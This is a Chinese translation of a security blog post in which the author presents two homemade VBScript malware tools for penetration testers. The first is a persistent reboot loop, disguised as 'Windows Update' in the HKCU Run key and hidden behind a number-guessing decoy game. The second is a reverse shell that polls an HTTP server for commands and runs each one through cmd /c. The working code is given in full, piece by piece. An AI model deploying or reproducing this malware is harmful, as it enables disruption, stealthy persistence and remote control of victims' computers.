<html>
<head>
<title>Fun with VBScript malware</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">有趣的VBScript恶意软件</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/fun-with-vbscript-malware-2f5bb0d107df?source=collection_archive---------0-----------------------#2021-04-09">https://infosecwriteups.com/fun-with-vbscript-malware-2f5bb0d107df?source=collection_archive---------0-----------------------#2021-04-09</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><div class=""><h2 id="ce13" class="pw-subtitle-paragraph jr it iu bd b js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki dk translated">一个无限重启脚本和一个(有些错误的)反向shell</h2></div><figure class="kk kl km kn gu ko gi gj paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gi gj kj"><img src="../Images/0a44db2eb2187e5751b3b62247ef1232.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*keWY9l0gNLkYXKHVm-DDsQ.png"/></div></div></figure><h1 id="a418" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">目录一览</h1><ol class=""><li id="cdb8" class="ln lo iu lp b lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">介绍</li><li id="adbb" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma mb mc md me bi translated">无限重启</li><li id="8ac5" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma mb mc md me bi translated">反向外壳</li><li id="33c3" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma mb mc md me bi translated">最后的想法</li><li id="103d" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma mb mc md me bi translated">感谢</li><li id="bc95" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma mb mc md me bi translated">引用的作品</li></ol><h1 id="c30e" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">介绍</h1><p id="5046" class="pw-post-body-paragraph mk ml iu lp b lq lr jv mm ls lt jy mn lu mo mp mq lw mr ms mt ly mu mv mw ma in bi mx translated">Visual Basic脚本语言(VBScript)是一种相当古老的解释语言，是微软Visual Basic语言的一个子集。它主要用于自动化系统管理任务，但也可能被恶意软件利用。其实众所周知的(In)著名的LOVELETTER病毒就是用VBScript ( <a class="ae nh" href="http://virus.wikidot.com/loveletter" rel="noopener ugc nofollow" target="_blank">病毒百科，n.d. </a>)编写的。</p><p id="ea8c" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">在这里，我将讨论我编写的几个VBScript恶意软件工具，希望这些工具可以作为其他渗透测试人员和安全研究人员开发工具的“跳板”。</p><h1 id="841a" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">无限重启</h1><p id="1d30" class="pw-post-body-paragraph mk ml iu lp b lq lr jv mm ls lt jy mn lu mo mp mq lw mr ms mt ly mu mv mw ma in bi translated">我将从一个简单的脚本开始，它将导致计算机系统在登录后重新启动。该脚本将安装一个批处理文件，该文件将在用户登录时重新启动计算机，安装后，将启动一个“猜我的随机数”游戏，以防止用户怀疑:</p><figure class="kk kl km kn gu ko"><div class="bz fq l di"><div class="nn no l"/></div></figure><p id="c080" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">运行此脚本将导致计算机“永久”重启，前提是:</p><ul class=""><li id="109f" class="ln lo iu lp b lq ni ls nj lu np lw nq ly nr ma ns mc md me bi translated">这台计算机有稳定的电源</li><li id="31ad" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma ns mc md me bi translated">用户不执行冷关断</li><li id="1d6a" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma ns mc md me bi translated">用户无法启动进入安全模式</li><li id="e4e3" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma ns mc md me bi translated">登录的帐户就是启动上述脚本的帐户</li></ul><p id="e3c8" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">让我们来分解一下脚本:</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="a616" class="ny kw iu nu b gz nz oa l ob oc">Option Explicit <br/>On Error Resume Next</span><span id="013c" class="ny kw iu nu b gz od oa l ob oc">Set oFileSystem = CreateObject(“Scripting.FileSystemObject”)<br/>Set WshShell = CreateObject(“WScript.Shell”)</span></pre><p id="07b7" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated"><code class="fe oe of og nu b">Option Explicit</code>和<code class="fe oe of og nu b">On Error Resume Next</code>行只是解释器忽略运行时错误和其他日常事务的指令。</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="894f" class="ny kw iu nu b gz nz oa l ob oc">' Install the reboot script</span><span id="22b7" class="ny kw iu nu b gz od oa l ob oc">app_data = WshShell.ExpandEnvironmentStrings(“%APPDATA%”)<br/>full_install = app_data &amp; “\winupdate.bat”</span><span id="836a" class="ny kw iu nu b gz od oa l ob oc">If Not oFileSystem.FileExists(full_install) Then<br/>    Set reboot_script = oFileSystem.CreateTextFile(full_install)<br/>    reboot_script.WriteLine(“shutdown -r -t 00”)<br/>    reboot_script.Close()</span><span id="7230" class="ny kw iu nu b gz od oa l ob oc">WshShell.RegWrite “HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update”, full_install, “REG_SZ”</span><span id="7d06" class="ny kw iu nu b gz od oa l ob oc">Set rs_map = oFileSystem.GetFile(full_install)<br/>    rs_map.Attributes = 2</span><span id="12dc" class="ny kw iu nu b gz od oa l ob oc">End If</span></pre><p id="4d10" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">这将安装脚本。首先，它将使用<code class="fe oe of og nu b">app_data = WshShell.ExpandEnvironmentStrings(“%APPDATA%”)</code>为有问题的用户计算出<code class="fe oe of og nu b">AppData\Roaming</code>目录，并将该目录与目标文件名连接起来(在我的例子中是<code class="fe oe of og nu b">winupdate.bat</code>)。</p><p id="2fa5" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">接下来，如果所述批处理文件尚不存在，脚本将继续将该批处理文件写入目标的<em class="ng"> AppData\Roaming </em>目录。批处理文件中会写入命令<code class="fe oe of og nu b">shutdown -r -t 00</code>，它会指示计算机立即重启。应该注意的是，YouTube用户<a class="ae nh" href="https://youtu.be/NaxWSf83Ft8" rel="noopener ugc nofollow" target="_blank"> JayFilkins (2008) </a>制作了他自己版本的“无限”重启脚本，该脚本利用了<em class="ng">Windows Management Instrumentation</em>(WMI)，而不是简单地使用命令行。</p><p id="6037" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">最后，我编写了一个小的随机数猜谜游戏，让用户(希望毫无戒心)不知道我的脚本的恶意性质:</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="1bd6" class="ny kw iu nu b gz nz oa l ob oc">Sub NumbersGame</span><span id="79b9" class="ny kw iu nu b gz od oa l ob oc">done = False<br/>    total_guesses = 0<br/>    Randomize<br/>    target = FormatNumber(Int((100 * Rnd) + 1))</span><span id="44d3" class="ny kw iu nu b gz od oa l ob oc">Do Until done<br/>        input = InputBox(“Type your guess:”, “Pick a number between 1 and 100”)<br/>        total_guesses = total_guesses + 1<br/>        If Len(input) &lt;&gt; 0 Then<br/>            If IsNumeric(input) Then<br/>                If FormatNumber(input) = target Then<br/>                    MsgBox(“Yes, the random number is “ &amp; input &amp; “ and it took you “ &amp; total_guesses &amp; “ guesses to get there!”)<br/>                    done = True<br/>                End If<br/>                If FormatNumber(input) &lt; target Then<br/>                    MsgBox(“Your guess is too small”)<br/>                End If<br/>                If FormatNumber(input) &gt; target Then<br/>                    MsgBox(“You guess is too large”)<br/>                End If<br/>            Else<br/>                MsgBox(“Please enter in a number.”)<br/>        End If<br/>        Else<br/>            MsgBox(“Please play again soon!”)<br/>            done = True<br/>        End If<br/>    Loop<br/>End Sub</span><span id="fd7b" class="ny kw iu nu b gz od oa l ob oc">Call NumbersGame</span></pre><p id="945c" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">这个脚本是福特(2014，ch。6).它首先初始化三个变量:</p><ul class=""><li id="3d90" class="ln lo iu lp b lq ni ls nj lu np lw nq ly nr ma ns mc md me bi translated">脚本将循环运行，直到目标正确猜出数字。当目标猜中数字时，<code class="fe oe of og nu b">done</code>将被设置为<code class="fe oe of og nu b">True</code>。</li><li id="01a4" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma ns mc md me bi translated"><code class="fe oe of og nu b">total_guesses = 0</code>这将记录目标猜测的次数。</li><li id="99f2" class="ln lo iu lp b lq mf ls mg lu mh lw mi ly mj ma ns mc md me bi translated"><code class="fe oe of og nu b">target = FormatNumber(Int((100 * Rnd) + 1))</code>这将是游戏的中奖随机数。注意脚本如何使用<code class="fe oe of og nu b">Randomize </code>语句来避免使用纯粹确定性的数字。</li></ul><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="347c" class="ny kw iu nu b gz nz oa l ob oc">Do Until done<br/>     input = InputBox(“Type your guess:”, “Pick a number between 1 and 100”)<br/>     total_guesses = total_guesses + 1<br/>     [ ... ]<br/>Loop</span></pre><p id="9df8" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">这个非常简单:在<code class="fe oe of og nu b">done</code>被设置为<code class="fe oe of og nu b">True</code>之前，脚本会要求目标输入他们对一个数字的猜测，并将猜测的总数增加1。</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="f502" class="ny kw iu nu b gz nz oa l ob oc">If Len(input) &lt;&gt; 0 Then<br/>    If IsNumeric(input) Then<br/>        If FormatNumber(input) = target Then<br/>            MsgBox(“Yes, the random number is “ &amp; input &amp; “ and it took you “ &amp; total_guesses &amp; “ guesses to get there!”)<br/>            done = True<br/>        End If<br/>        If FormatNumber(input) &lt; target Then<br/>            MsgBox(“Your guess is too small”)<br/>        End If<br/>        If FormatNumber(input) &gt; target Then<br/>            MsgBox(“You guess is too large”)<br/>        End If<br/>    Else<br/>        MsgBox(“Please enter in a number.”)<br/>    End If<br/>Else<br/>    MsgBox(“Please play again soon!”)<br/>    done = True<br/>End If</span></pre><p id="285c" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">在这里，检查输入是否为空(如果是，那么游戏将关闭)，看一个数字是否确实是一个数字，然后将输入与猜测进行比较。</p><p id="dced" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">如果输入匹配目标变量，那么程序将祝贺用户并结束。如果不是，那么循环将继续，直到用户猜出正确的数字，脚本将提醒用户数字是太大还是太小。</p><p id="034c" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">这只是一个可以开玩笑的小恶作剧，可以通过引导进入<em class="ng"> Windows安全模式</em>(通常通过F4/F5/F6/F8键)并删除<code class="fe oe of og nu b">AppData\Roaming</code>目录中的<code class="fe oe of og nu b">winupdate.bat</code>文件以及删除HKCU运行注册表项中的“Windows Update”条目来轻松删除。</p><h1 id="a5d4" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">反向外壳</h1><p id="4d99" class="pw-post-body-paragraph mk ml iu lp b lq lr jv mm ls lt jy mn lu mo mp mq lw mr ms mt ly mu mv mw ma in bi translated">这个脚本是一个小型的基本反向shell:</p><figure class="kk kl km kn gu ko"><div class="bz fq l di"><div class="nn no l"/></div></figure><p id="cf93" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">它将自己安装到当前用户的<code class="fe oe of og nu b">AppData\Roaming</code>目录中，然后从外部HTTP服务器寻找命令。这个概念和一些代码“风格”——因为缺乏更好的术语——是从<a class="ae nh" href="http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html" rel="noopener ugc nofollow" target="_blank"> Picard (2018) </a>借来的，但尽管如此，我确实觉得我能够做出足够大的改变，可以称之为我自己独特的东西。</p><p id="b360" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">和“无限重启”脚本一样，这个脚本会自动安装到计算机上。然而，由于安装机制非常类似于我所说的无限重启脚本，我就不赘述了。我将只关注与HTTP服务器通信以执行命令的部分。</p><p id="0e66" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">首先，我将定义一个指向HTTP服务器及其相应端口的Const变量，以及一个名为<code class="fe oe of og nu b">done</code>并设置为<code class="fe oe of og nu b">False</code>的布尔变量:</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="5a23" class="ny kw iu nu b gz nz oa l ob oc">Const server = "http://10.0.2.2:8000/command.txt"</span><span id="024d" class="ny kw iu nu b gz od oa l ob oc">[ ... ]</span><span id="f560" class="ny kw iu nu b gz od oa l ob oc">done = False</span></pre><p id="43ae" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">然后我会设置一个Do循环</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="c710" class="ny kw iu nu b gz nz oa l ob oc">Do Until done<br/>	[ ... ]<br/>Loop</span></pre><p id="0945" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">在这个循环中，我将连接到HTTP服务器，打开一个对文本文件的GET请求，其中包含要执行的命令:</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="6be1" class="ny kw iu nu b gz nz oa l ob oc">Set XMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")<br/>XMLHTTP.open "GET", server, False<br/>XMLHTTP.send<br/>command = XMLHTTP.responseText</span></pre><p id="d3f0" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">在获取命令的文本文件并存储在<code class="fe oe of og nu b">command</code>变量中后，将使用一点条件逻辑来决定是否退出脚本的执行、卸载脚本或执行命令:</p><pre class="kk kl km kn gu nt nu nv nw aw nx bi"><span id="bbcd" class="ny kw iu nu b gz nz oa l ob oc">If InStr(command, "EXIT") Then<br/>    done = True<br/>End If<br/>	<br/>If InStr(command, "REMOVE") Then<br/>    WshShell.RegDelete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update"<br/>    Set delete_me = oFileSystem.CreateTextFile(oFileSystem.GetSpecialFolder(2) &amp; "\romcs.bat")<br/>    delete_me.WriteLine("@echo off")<br/>    delete_me.WriteLine("timeout 10")<br/>    delete_me.Close()<br/>		<br/>    WshShell.Run oFileSystem.GetSpecialFolder(2) &amp; "\romcs.bat"<br/>    done = True<br/>Else<br/>    WshShell.Run "cmd /c " &amp; command, 0, True<br/>End If<br/>	<br/>WScript.Sleep(15000)</span></pre><p id="2b72" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">如果<code class="fe oe of og nu b">command</code>变量有一个<code class="fe oe of og nu b">EXIT</code>，脚本将关闭，或者如果<code class="fe oe of og nu b">command</code>变量有一个<code class="fe oe of og nu b">REMOVE</code>，脚本将尝试卸载。否则，脚本将通过<code class="fe oe of og nu b">cmd /c &lt;command to execute&gt;</code>运行命令，并休眠大约十五(15)秒。</p><p id="36ae" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">请注意，<em class="ng"> Windows Defender </em>或其他一些反病毒工具可能会试图阻止脚本的<code class="fe oe of og nu b">WshShell.Run</code>部分执行代码(正如我测试这些脚本时发生的情况)。</p><h1 id="bf54" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">最后的想法</h1><p id="7c27" class="pw-post-body-paragraph mk ml iu lp b lq lr jv mm ls lt jy mn lu mo mp mq lw mr ms mt ly mu mv mw ma in bi translated">对于你们中的一些人来说，我对我的(相当简单的)VBScript恶意软件的评论可能被视为“儿戏”或“新手的东西”，这是一个公平的批评。这只是我在试验不同种类的恶意软件工具，这些工具可用于渗透测试或计算机网络操作。</p><p id="f16c" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">请记住，如果您决定在您的渗透测试项目中使用我的脚本，一定要彻底测试它们，并了解它们可能存在的任何潜在弱点。</p><h1 id="a98b" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">承认</h1><p id="0beb" class="pw-post-body-paragraph mk ml iu lp b lq lr jv mm ls lt jy mn lu mo mp mq lw mr ms mt ly mu mv mw ma in bi translated">黑客Fantastic，Agnes Driscoll，<a class="ae nh" href="https://twitter.com/krichard1212" rel="noopener ugc nofollow" target="_blank"> @krichard1212 </a>，<a class="ae nh" href="https://twitter.com/anal_sex42069" rel="noopener ugc nofollow" target="_blank"> @anal_sex42069 </a>，<a class="ae nh" href="https://twitter.com/TheExiaRoss00" rel="noopener ugc nofollow" target="_blank"> @TheExiaRoss00 </a>，阿曼达卢梭，艾登帕拉丁，纳西姆塔勒布。</p><p id="79c1" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">我还想提醒大家注意特雷冯·马丁、迈克·布朗和乔治·弗洛伊德——他们是我们种族主义制度的受害者，我们需要对这种制度采取一些措施。</p><h1 id="d7e4" class="kv kw iu bd kx ky kz la lb lc ld le lf ka lg kb lh kd li ke lj kg lk kh ll lm bi translated">引用的作品</h1><p id="a759" class="pw-post-body-paragraph mk ml iu lp b lq lr jv mm ls lt jy mn lu mo mp mq lw mr ms mt ly mu mv mw ma in bi translated">福特律师事务所(2014年)。<em class="ng">微软WSH和VBScript编程绝对初学者</em>(第4版。).俄亥俄州梅森:森盖奇学习定制出版。</p><p id="b846" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">JayFilkins (2008)。<em class="ng">如何编写VBScript病毒/木马</em>。YouTube。2021年4月6日检索自:<a class="ae nh" href="https://youtu.be/NaxWSf83Ft8" rel="noopener ugc nofollow" target="_blank">https://youtu.be/NaxWSf83Ft8</a></p><p id="fde4" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">皮卡尔，C. (2018)。<em class="ng"> VBS反壳</em>。断点。2021年4月6日检索自:<a class="ae nh" href="http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html" rel="noopener ugc nofollow" target="_blank">http://breakpoint . purfect . fr/article/VBS _ reverse _ shell . html</a></p><p id="5587" class="pw-post-body-paragraph mk ml iu lp b lq ni jv mm ls nj jy mn lu nk mp mq lw nl ms mt ly nm mv mw ma in bi translated">病毒百科全书(未注明)。<em class="ng">情书</em>。2021年4月6日检索自:【http://virus.wikidot.com/loveletter T2】</p></div></div>    
</body>
</html>